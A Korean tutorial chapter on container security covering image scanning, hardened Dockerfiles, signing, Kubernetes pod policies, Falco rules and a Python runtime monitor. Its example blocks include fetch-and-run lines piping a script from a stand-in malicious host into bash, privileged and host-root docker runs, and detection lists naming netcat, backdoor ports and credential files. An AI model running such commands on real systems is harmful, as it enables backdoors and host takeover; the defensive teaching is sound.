---
tags:
  - Container Security
  - Docker
  - Image Scanning
  - Runtime Security
  - Kubernetes Security
---

# Chapter 15-4: 컨테이너 보안 - 격리된 것처럼 보이지만 실제로는

## 이 문서를 읽고 나면 답할 수 있는 질문들

- 컨테이너 이미지에서 취약점을 어떻게 찾나요?
- Privileged 컨테이너가 왜 위험한가요?
- 컨테이너 이스케이프는 어떻게 발생하나요?
- Kubernetes에서 Pod Security를 어떻게 강화하나요?
- Supply Chain 공격을 어떻게 방어하나요?

## 들어가며: 컨테이너의 보안 착각

### 🐋 2019년 Docker Hub 해킹: 19만 계정 정보 유출

2019년 4월, Docker의 공식 레지스트리인 Docker Hub가 해킹당해 19만 개 계정 정보가 유출되었습니다.

**사고의 심각성**:

```bash
# 유출된 정보들
- 사용자명과 해시된 패스워드: 190,000개 계정
- GitHub/Bitbucket 액세스 토큰: 수천 개
- 자동 빌드 설정 정보
- 프라이빗 레포지토리 접근 권한

# 🚨 가장 위험했던 점
해커들이 인기 있는 이미지들에 악성 코드를 삽입할 수 있었음
→ 전 세계 개발자들이 모르고 악성 이미지를 다운로드할 뻔함
```

**Supply Chain 공격의 위험성**:

```dockerfile
# 겉보기에 정상적인 Dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y python3 python3-pip
COPY app.py /app/
WORKDIR /app

# 😱 하지만 숨겨진 악성 코드
RUN curl -s https://malicious-site.com/backdoor.sh | bash
# 또는 base 이미지 자체에 백도어가 있을 수 있음

CMD ["python3", "app.py"]
```

**실제 피해 사례들**:

```text
2018년: Cryptojacking 멀웨어가 포함된 이미지들
- Docker Hub에서 다운로드 10,000회 이상
- 컨테이너 실행 시 자동으로 암호화폐 채굴

2020년: 정부기관 대상 공격
- 가짜 OpenSSL 이미지에 백도어
- CI/CD 파이프라인을 통해 자동 배포
- 수개월간 탐지되지 않음
```

### 🎭 "컨테이너는 안전하다"는 착각

많은 개발자들이 가지고 있는 잘못된 믿음들:

```bash
❌ 잘못된 믿음들:
"컨테이너는 VM처럼 완전히 격리되어 있다"
→ 실제로는 같은 커널을 공유함

"Docker 이미지는 공식이면 안전하다"
→ 공식 이미지도 취약점이 있을 수 있음

"컨테이너 안에서는 root가 안전하다"
→ 컨테이너 이스케이프로 호스트 root 탈취 가능

"Private Registry면 안전하다"
→ 내부 공격자나 설정 실수로 노출 가능
```

## 컨테이너 이미지 보안

### 이미지 취약점 스캐닝

```bash
#!/bin/bash
# image_security_scan.sh - 종합적인 이미지 보안 스캔

echo "=== Container Image Security Scan ==="

IMAGE_NAME="myapp:latest"

# 1. Trivy를 사용한 취약점 스캔
echo "1. Vulnerability Scanning with Trivy..."
trivy image --severity HIGH,CRITICAL $IMAGE_NAME

# 2. Docker Scout를 사용한 추가 스캔
echo "2. Additional scan with Docker Scout..."
docker scout cves $IMAGE_NAME

# 3. 이미지 레이어 분석
echo "3. Layer Analysis..."
docker history $IMAGE_NAME --no-trunc

# 4. 이미지 구성 정보 추출
echo "4. Image Configuration..."
docker inspect $IMAGE_NAME | jq '.[0].Config'

# 5. Secrets 스캔 (하드코딩된 패스워드, API 키 등)
echo "5. Secrets Detection..."
trivy fs --scanners secret .

# 6. 라이센스 스캔
echo "6. License Scanning..."
trivy image --scanners license $IMAGE_NAME

# 7. SBOM (Software Bill of Materials) 생성
echo "7. Generating SBOM..."
syft $IMAGE_NAME -o json > sbom.json
grype sbom:sbom.json

echo "=== Scan Complete ==="
```

### 안전한 Dockerfile 작성

```dockerfile
# secure-dockerfile - 보안이 강화된 Dockerfile 예시
# Multi-stage build로 최종 이미지 크기 최소화
FROM node:18-alpine AS builder

# 보안 업데이트 적용
RUN apk update && apk upgrade && \
    apk add --no-cache dumb-init

# 소스 코드 복사 및 빌드
WORKDIR /build
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force
COPY . .
RUN npm run build

# 운영 스테이지 (distroless 사용)
FROM gcr.io/distroless/nodejs18-debian11

# 라벨로 메타데이터 추가 (보안 추적용)
LABEL maintainer="security@company.com" \
      version="1.0.0" \
      security.scan-date="2023-10-21" \
      org.opencontainers.image.source="https://github.com/company/app"

# 비특권 사용자 생성 및 사용
USER nonroot:nonroot

# 필요한 파일만 복사
COPY --from=builder --chown=nonroot:nonroot /build/dist /app
COPY --from=builder --chown=nonroot:nonroot /build/node_modules /app/node_modules

WORKDIR /app

# 읽기 전용 루트 파일시스템 (런타임에서 설정)
# VOLUME을 통해 쓰기 가능한 디렉토리만 마운트

# 불필요한 포트 노출 금지 (필요한 포트만)
EXPOSE 3000

# 헬스체크 추가
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD ["node", "healthcheck.js"]

# 보안 강화된 실행
ENTRYPOINT ["node", "server.js"]
```

### 이미지 서명 및 검증

```bash
#!/bin/bash
# image_signing.sh - Docker Content Trust를 사용한 이미지 서명

# 1. Content Trust 활성화
export DOCKER_CONTENT_TRUST=1
export DOCKER_CONTENT_TRUST_SERVER=https://notary.company.com

# 2. 루트 키 생성 (최초 1회)
docker trust key generate company-root
# 생성된 키를 안전한 장소에 백업 (Hardware Security Module 권장)

# 3. 이미지 서명 및 푸시
echo "Signing and pushing image..."
docker trust sign myregistry.com/myapp:v1.0.0

# 4. 서명된 이미지 검증
echo "Verifying signed image..."
docker trust inspect myregistry.com/myapp:v1.0.0

# 5. 자동 검증 정책 설정
cat > /etc/docker/daemon.json <<EOF
{
  "content-trust": {
    "trust-server": "https://notary.company.com",
    "trust-enforcement": true
  }
}
EOF

systemctl restart docker

echo "Image signing setup complete"
```

### 레지스트리 보안

```yaml
# secure-registry.yml - 안전한 프라이빗 레지스트리 구성
version: '3.8'
services:
  registry:
    image: registry:2.8.1
    restart: always
    ports:
      - "5000:5000"
    environment:
      # TLS 설정 (필수)
      REGISTRY_HTTP_TLS_CERTIFICATE: /certs/domain.crt
      REGISTRY_HTTP_TLS_KEY: /certs/domain.key

      # 인증 설정
      REGISTRY_AUTH: htpasswd
      REGISTRY_AUTH_HTPASSWD_PATH: /auth/htpasswd
      REGISTRY_AUTH_HTPASSWD_REALM: Registry Realm

      # 취약점 스캔 연동
      REGISTRY_NOTIFICATIONS_ENDPOINTS: |
        - name: scanner
          url: https://scanner.company.com/webhook
          headers:
            Authorization: [Bearer <token>]

    volumes:
      - registry-data:/var/lib/registry
      - ./certs:/certs:ro
      - ./auth:/auth:ro

    # 보안 제약 사항
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp

  # 취약점 스캐너 (Clair)
  clair:
    image: quay.io/coreos/clair:v2.1.8
    restart: always
    depends_on:
      - postgres
    ports:
      - "6060:6060"  # API
      - "6061:6061"  # Health check
    volumes:
      - ./clair-config:/config:ro
    command: [-config=/config/config.yaml]

  postgres:
    image: postgres:14-alpine
    restart: always
    environment:
      POSTGRES_DB: clair
      POSTGRES_USER: clair
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    volumes:
      - postgres-data:/var/lib/postgresql/data
    secrets:
      - db_password

volumes:
  registry-data:
  postgres-data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

## 런타임 보안

### 컨테이너 이스케이프 방지

```yaml
# secure-pod.yaml - 보안이 강화된 Kubernetes Pod 설정
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  annotations:
    seccomp.security.alpha.kubernetes.io/pod: runtime/default
spec:
  # 보안 컨텍스트 (Pod 레벨)
  securityContext:
    runAsNonRoot: true          # root 사용자 금지
    runAsUser: 1000             # 특정 UID 지정
    runAsGroup: 3000            # 특정 GID 지정
    fsGroup: 2000               # 파일시스템 그룹
    seccompProfile:             # seccomp 프로필
      type: RuntimeDefault
    supplementalGroups: [4000]  # 추가 그룹

  containers:
  - name: app
    image: myapp:secure

    # 컨테이너별 보안 컨텍스트
    securityContext:
      allowPrivilegeEscalation: false  # 권한 상승 금지
      runAsNonRoot: true
      runAsUser: 1000
      readOnlyRootFilesystem: true     # 루트 FS 읽기 전용

      # Linux Capabilities 최소화
      capabilities:
        drop:
        - ALL                          # 모든 capability 제거
        add:
        - NET_BIND_SERVICE            # 필요한 것만 추가

      # seccomp 프로필 (시스템 콜 제한)
      seccompProfile:
        type: Localhost
        localhostProfile: profiles/restricted.json

    # 리소스 제한 (DoS 방지)
    resources:
      limits:
        cpu: "500m"
        memory: "512Mi"
        ephemeral-storage: "1Gi"
      requests:
        cpu: "200m"
        memory: "256Mi"
        ephemeral-storage: "500Mi"

    # 환경변수 (보안)
    env:
    - name: APP_ENV
      value: "production"
    # 민감한 정보는 Secret 사용
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: db-password

    # 볼륨 마운트 (최소한만)
    volumeMounts:
    - name: tmp-volume
      mountPath: /tmp
    - name: cache-volume
      mountPath: /app/cache
    - name: config-volume
      mountPath: /app/config
      readOnly: true

    # 헬스체크
    livenessProbe:
      httpGet:
        path: /health
        port: 8080
      initialDelaySeconds: 30

    readinessProbe:
      httpGet:
        path: /ready
        port: 8080
      initialDelaySeconds: 5

  # 볼륨 정의
  volumes:
  - name: tmp-volume
    emptyDir:
      sizeLimit: 100Mi
  - name: cache-volume
    emptyDir:
      sizeLimit: 500Mi
  - name: config-volume
    configMap:
      name: app-config

  # DNS 정책
  dnsPolicy: ClusterFirst

  # 자동 마운트 비활성화
  automountServiceAccountToken: false

---
# NetworkPolicy - 네트워크 접근 제한
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: secure-app-netpol
spec:
  podSelector:
    matchLabels:
      app: secure-app
  policyTypes:
  - Ingress
  - Egress

  ingress:
  # 특정 네임스페이스의 특정 앱에서만 접근 허용
  - from:
    - namespaceSelector:
        matchLabels:
          name: frontend
      podSelector:
        matchLabels:
          app: web-server
    ports:
    - protocol: TCP
      port: 8080

  egress:
  # 데이터베이스와 외부 API만 접근 허용
  - to:
    - namespaceSelector:
        matchLabels:
          name: database
    ports:
    - protocol: TCP
      port: 5432
  # DNS 해결을 위해 필요
  - to: []
    ports:
    - protocol: UDP
      port: 53
```

### 실시간 위협 탐지

```yaml
# falco-rules.yaml - Falco 보안 규칙 정의
- rule: Container Run as Root User
  desc: Detect containers running as root user
  condition: >
    spawned_process and container and proc.name != pause and
    user.uid=0 and not user_known_container_root_programs
  output: >
    Container running as root user (user=%user.name user_uid=%user.uid
    container=%container.info command=%proc.cmdline)
  priority: WARNING

- rule: Sensitive File Access
  desc: Detect access to sensitive files
  condition: >
    open_read and container and
    (fd.filename startswith /etc/shadow or
     fd.filename startswith /etc/passwd or
     fd.filename startswith /root/.ssh)
  output: >
    Sensitive file accessed in container (user=%user.name
    file=%fd.name container=%container.info)
  priority: HIGH

- rule: Container Escape Attempt
  desc: Detect potential container escape attempts
  condition: >
    spawned_process and container and
    (proc.name in (nsenter, docker, runc, kubectl) or
     proc.cmdline contains "docker run --privileged" or
     proc.cmdline contains "/proc/1/root")
  output: >
    Container escape attempt detected (user=%user.name
    command=%proc.cmdline container=%container.info)
  priority: CRITICAL

- rule: Cryptocurrency Mining
  desc: Detect cryptocurrency mining activity
  condition: >
    spawned_process and container and
    (proc.name in (xmrig, minerd, cpuminer) or
     proc.cmdline contains "stratum" or
     proc.cmdline contains "mining.pool")
  output: >
    Cryptocurrency mining detected (user=%user.name
    command=%proc.cmdline container=%container.info)
  priority: HIGH

- rule: Suspicious Network Activity
  desc: Detect suspicious network connections
  condition: >
    inbound_outbound and container and
    (fd.rip in ("192.168.1.100", "10.0.0.1") or  # Known bad IPs
     fd.rport in (4444, 5555, 6666))  # Common backdoor ports
  output: >
    Suspicious network activity (connection=%fd.rip:%fd.rport
    container=%container.info)
  priority: HIGH
```

### 런타임 보안 모니터링

```python
#!/usr/bin/env python3
# container_runtime_monitor.py - 컨테이너 런타임 보안 모니터링

import docker
import psutil
import json
import time
import logging
from datetime import datetime
from typing import Dict, List, Any
import subprocess

class ContainerSecurityMonitor:
    def __init__(self):
        self.client = docker.from_env()
        self.suspicious_processes = [
            'nc', 'netcat', 'ncat',           # 네트워크 도구
            'wget', 'curl',                   # 다운로드 도구 (의심스러운 사용)
            'python -c', 'perl -e',           # 인라인 스크립트
            'base64', 'xxd',                  # 인코딩/디코딩
            '/bin/bash', '/bin/sh',           # 쉘 접근
            'docker', 'kubectl',              # 컨테이너 관리 도구
            'mount', 'umount',                # 파일시스템 조작
        ]

        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('container_security.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def monitor_containers(self):
        """실행 중인 모든 컨테이너 모니터링"""

        while True:
            try:
                containers = self.client.containers.list()

                for container in containers:
                    self.analyze_container_security(container)

                time.sleep(10)  # 10초마다 검사

            except Exception as e:
                self.logger.error(f"Monitoring error: {e}")
                time.sleep(30)

    def analyze_container_security(self, container):
        """개별 컨테이너 보안 분석"""

        container_name = container.name
        container_id = container.id[:12]

        # 1. 권한 검사
        self.check_privileged_container(container)

        # 2. 프로세스 검사
        self.check_suspicious_processes(container)

        # 3. 네트워크 연결 검사
        self.check_network_connections(container)

        # 4. 파일시스템 접근 검사
        self.check_filesystem_access(container)

        # 5. 리소스 사용량 검사
        self.check_resource_usage(container)

    def check_privileged_container(self, container):
        """특권 컨테이너 검사"""

        config = container.attrs.get('HostConfig', {})

        # Privileged 모드 체크
        if config.get('Privileged', False):
            self.alert('CRITICAL', 'Privileged Container',
                      f"Container {container.name} is running in privileged mode",
                      container)

        # 위험한 Capability 체크
        cap_add = config.get('CapAdd', [])
        dangerous_caps = ['SYS_ADMIN', 'SYS_PTRACE', 'SYS_MODULE', 'DAC_OVERRIDE']

        for cap in cap_add:
            if cap in dangerous_caps:
                self.alert('HIGH', 'Dangerous Capability',
                          f"Container {container.name} has dangerous capability: {cap}",
                          container)

        # 호스트 네임스페이스 공유 체크
        if config.get('NetworkMode') == 'host':
            self.alert('HIGH', 'Host Network Mode',
                      f"Container {container.name} shares host network namespace",
                      container)

        if config.get('PidMode') == 'host':
            self.alert('CRITICAL', 'Host PID Mode',
                      f"Container {container.name} shares host PID namespace",
                      container)

    def check_suspicious_processes(self, container):
        """의심스러운 프로세스 검사"""

        try:
            # 컨테이너 내부 프로세스 목록
            top_result = container.top()
            processes = top_result.get('Processes', [])

            for process in processes:
                if len(process) > 7:  # 프로세스 정보가 충분한 경우
                    pid, ppid, c, stime, tty, time, cmd = process[:7]

                    # 의심스러운 명령어 검사
                    for suspicious_cmd in self.suspicious_processes:
                        if suspicious_cmd in cmd.lower():
                            self.alert('MEDIUM', 'Suspicious Process',
                                     f"Suspicious process in container {container.name}: {cmd}",
                                     container)
                            break

                    # 암호화폐 채굴 프로세스 검사
                    mining_keywords = ['xmrig', 'minerd', 'cpuminer', 'stratum']
                    if any(keyword in cmd.lower() for keyword in mining_keywords):
                        self.alert('CRITICAL', 'Cryptocurrency Mining',
                                 f"Mining process detected in container {container.name}: {cmd}",
                                 container)

        except Exception as e:
            self.logger.debug(f"Process check error for {container.name}: {e}")

    def check_network_connections(self, container):
        """네트워크 연결 검사"""

        try:
            # 컨테이너의 네트워크 통계
            stats = container.stats(stream=False)
            network_stats = stats.get('networks', {})

            for interface, data in network_stats.items():
                rx_bytes = data.get('rx_bytes', 0)
                tx_bytes = data.get('tx_bytes', 0)

                # 비정상적으로 높은 네트워크 사용량
                if rx_bytes > 100 * 1024 * 1024 or tx_bytes > 100 * 1024 * 1024:  # 100MB
                    self.alert('MEDIUM', 'High Network Usage',
                             f"High network usage in container {container.name}: "
                             f"RX: {rx_bytes/1024/1024:.2f}MB, TX: {tx_bytes/1024/1024:.2f}MB",
                             container)

            # 포트 바인딩 검사
            port_bindings = container.attrs.get('HostConfig', {}).get('PortBindings', {})
            for container_port, host_bindings in port_bindings.items():
                if host_bindings:
                    for binding in host_bindings:
                        host_port = binding.get('HostPort')
                        # 위험한 포트 바인딩
                        dangerous_ports = ['22', '23', '3389', '5900']  # SSH, Telnet, RDP, VNC
                        if host_port in dangerous_ports:
                            self.alert('HIGH', 'Dangerous Port Binding',
                                     f"Container {container.name} exposes dangerous port {host_port}",
                                     container)

        except Exception as e:
            self.logger.debug(f"Network check error for {container.name}: {e}")

    def check_filesystem_access(self, container):
        """파일시스템 접근 검사"""

        try:
            # 볼륨 마운트 검사
            mounts = container.attrs.get('Mounts', [])

            for mount in mounts:
                source = mount.get('Source', '')
                destination = mount.get('Destination', '')
                mode = mount.get('Mode', '')

                # 위험한 호스트 디렉토리 마운트
                dangerous_mounts = ['/etc', '/root', '/home', '/var', '/usr', '/bin', '/sbin']

                for dangerous_path in dangerous_mounts:
                    if source.startswith(dangerous_path):
                        severity = 'CRITICAL' if 'rw' in mode else 'HIGH'
                        self.alert(severity, 'Dangerous Mount',
                                 f"Container {container.name} mounts dangerous path: "
                                 f"{source} -> {destination} ({mode})",
                                 container)

                # Docker socket 마운트 (매우 위험)
                if '/var/run/docker.sock' in source:
                    self.alert('CRITICAL', 'Docker Socket Mount',
                             f"Container {container.name} has access to Docker socket",
                             container)

        except Exception as e:
            self.logger.debug(f"Filesystem check error for {container.name}: {e}")

    def check_resource_usage(self, container):
        """리소스 사용량 검사"""

        try:
            stats = container.stats(stream=False)

            # CPU 사용량
            cpu_stats = stats.get('cpu_stats', {})
            precpu_stats = stats.get('precpu_stats', {})

            if cpu_stats and precpu_stats:
                cpu_usage = self.calculate_cpu_usage(cpu_stats, precpu_stats)
                if cpu_usage > 90:  # 90% 이상 CPU 사용
                    self.alert('MEDIUM', 'High CPU Usage',
                             f"Container {container.name} using {cpu_usage:.2f}% CPU",
                             container)

            # 메모리 사용량
            memory_stats = stats.get('memory_stats', {})
            if memory_stats:
                memory_usage = memory_stats.get('usage', 0)
                memory_limit = memory_stats.get('limit', 0)

                if memory_limit > 0:
                    memory_percent = (memory_usage / memory_limit) * 100
                    if memory_percent > 90:  # 90% 이상 메모리 사용
                        self.alert('MEDIUM', 'High Memory Usage',
                                 f"Container {container.name} using {memory_percent:.2f}% memory",
                                 container)

        except Exception as e:
            self.logger.debug(f"Resource check error for {container.name}: {e}")

    def calculate_cpu_usage(self, cpu_stats, precpu_stats):
        """CPU 사용률 계산"""
        cpu_delta = cpu_stats['cpu_usage']['total_usage'] - precpu_stats['cpu_usage']['total_usage']
        system_delta = cpu_stats['system_cpu_usage'] - precpu_stats['system_cpu_usage']

        if system_delta > 0:
            cpu_percent = (cpu_delta / system_delta) * len(cpu_stats['cpu_usage']['percpu_usage']) * 100
            return cpu_percent

        return 0

    def alert(self, severity: str, alert_type: str, message: str, container):
        """보안 알림 발송"""

        alert_data = {
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'alert_type': alert_type,
            'message': message,
            'container_id': container.id,
            'container_name': container.name,
            'image': container.image.tags[0] if container.image.tags else 'unknown'
        }

        if severity == 'CRITICAL':
            self.logger.critical(f"🚨 {alert_type}: {message}")
        elif severity == 'HIGH':
            self.logger.error(f"⚠️  {alert_type}: {message}")
        elif severity == 'MEDIUM':
            self.logger.warning(f"⚠️  {alert_type}: {message}")
        else:
            self.logger.info(f"ℹ️  {alert_type}: {message}")

        # 실제 환경에서는 Slack, PagerDuty 등으로 알림
        self.send_alert_notification(alert_data)

    def send_alert_notification(self, alert_data):
        """외부 시스템으로 알림 전송"""
        # 실제로는 Webhook, Slack API 등 사용
        with open('security_alerts.jsonl', 'a') as f:
            f.write(json.dumps(alert_data) + ', ')

# 사용 예시
if __name__ == "__main__":
    monitor = ContainerSecurityMonitor()

    print("Starting container security monitoring...")
    print("Press Ctrl+C to stop")

    try:
        monitor.monitor_containers()
    except KeyboardInterrupt:
        print(", Monitoring stopped")
```

## Pod Security Standards

### Pod Security 정책 구현

```yaml
# pod-security-policy.yaml - Pod Security Standards 구현
apiVersion: v1
kind: Namespace
metadata:
  name: secure-production
  labels:
    # Pod Security Standards 적용
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

---
# SecurityContextConstraints (OpenShift) 또는 PodSecurityPolicy (deprecated)
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted-psp
spec:
  privileged: false                    # 특권 컨테이너 금지
  allowPrivilegeEscalation: false      # 권한 상승 금지

  # 필수 사용자 설정
  runAsUser:
    rule: MustRunAsNonRoot            # 비root 사용자 필수
  runAsGroup:
    rule: MustRunAs
    ranges:
    - min: 1000
      max: 65535

  # 파일시스템
  readOnlyRootFilesystem: true         # 읽기 전용 루트 FS 필수

  # 볼륨 제한
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  - 'downwardAPI'
  - 'persistentVolumeClaim'
  # 위험한 볼륨 타입 제외: hostPath, hostPID, hostNetwork

  # 네트워크
  hostNetwork: false                   # 호스트 네트워크 금지
  hostIPC: false                       # 호스트 IPC 금지
  hostPID: false                       # 호스트 PID 금지

  # 포트 제한
  hostPorts:
  - min: 0
    max: 0                            # 호스트 포트 바인딩 금지

  # Linux 보안
  seLinux:
    rule: RunAsAny
  supplementalGroups:
    rule: MustRunAs
    ranges:
    - min: 1000
      max: 65535
  fsGroup:
    rule: MustRunAs
    ranges:
    - min: 1000
      max: 65535

  # Capabilities 제한
  requiredDropCapabilities:
  - ALL                               # 모든 capability 제거 필수
  allowedCapabilities: []             # 추가 capability 허용 안함
  defaultAddCapabilities: []

  # Seccomp
  seccomp:
    defaultProfile: runtime/default

  # AppArmor (노드에서 지원하는 경우)
  annotations:
    apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
    apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'

---
# ClusterRole for PSP
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: restricted-psp-user
rules:
- apiGroups:
  - policy
  resources:
  - podsecuritypolicies
  verbs:
  - use
  resourceNames:
  - restricted-psp

---
# ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: restricted-psp-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: restricted-psp-user
subjects:
- kind: ServiceAccount
  name: default
  namespace: secure-production
```

## 핵심 요점 정리

### 🎯 컨테이너 보안의 원칙들

1. **최소 권한**: 컨테이너에 필요한 최소한의 권한만 부여
2. **깊이 있는 방어**: 이미지, 런타임, 네트워크 등 다층 보안
3. **지속적 모니터링**: 런타임에서의 실시간 위협 탐지
4. **공급망 보안**: 신뢰할 수 있는 이미지만 사용
5. **최신 상태 유지**: 정기적인 이미지 업데이트와 패치

### ⚠️ 흔한 실수들

```dockerfile
# ❌ 위험한 컨테이너 설정들
FROM ubuntu                          # 불필요한 패키지 많은 이미지
USER root                           # root 사용자로 실행
RUN wget https://unknown-site.com/script.sh | bash  # 의심스러운 스크립트 실행
COPY . .                            # 불필요한 파일들까지 복사
EXPOSE 22                           # SSH 포트 노출

# Docker 실행 시
docker run --privileged myapp       # 특권 모드 사용
docker run -v /:/host-root myapp     # 호스트 루트 마운트
docker run --net=host myapp         # 호스트 네트워크 사용

# ✅ 안전한 설정들
FROM node:18-alpine                  # 최소한의 Alpine 이미지
USER 1000:1000                      # 비특권 사용자
COPY package*.json ./                # 필요한 파일만 복사
RUN apk update && apk upgrade        # 보안 업데이트 적용

# 안전한 실행
docker run --read-only \
  --user 1000:1000 \
  --cap-drop=ALL \
  --no-new-privileges \
  myapp
```

### 🛡️ 컨테이너 보안 체크리스트

```bash
# 이미지 보안
✅ 취약점 스캔 자동화 (Trivy, Clair)
✅ 최신 베이스 이미지 사용
✅ Distroless 또는 Alpine 이미지 선택
✅ 이미지 서명 및 검증
✅ Private Registry 사용

# 런타임 보안
✅ 비특권 사용자로 실행
✅ 읽기 전용 루트 파일시스템
✅ Capability 최소화
✅ Seccomp 프로필 적용
✅ 리소스 제한 설정

# Kubernetes 보안
✅ Pod Security Standards 적용
✅ Network Policy 구성
✅ Service Account 최소 권한
✅ Secrets 암호화 저장
✅ 정기적인 보안 감사
```

---

## 다음 단계

컨테이너 보안을 마스터했다면, 이제 데이터 보호의 핵심인 암호화 기술을 배워보겠습니다:

**Next**: [15.5 암호화와 키 관리](05-cryptography-key-management.md)에서 현대 암호화 알고리즘부터 안전한 키 관리까지 다룹니다.

**Key Takeaway**: "컨테이너는 격리되어 있는 것처럼 보이지만, 같은 커널을 공유합니다. 진정한 보안은 다층 방어와 지속적인 모니터링에서 나옵니다." 🐋🔒
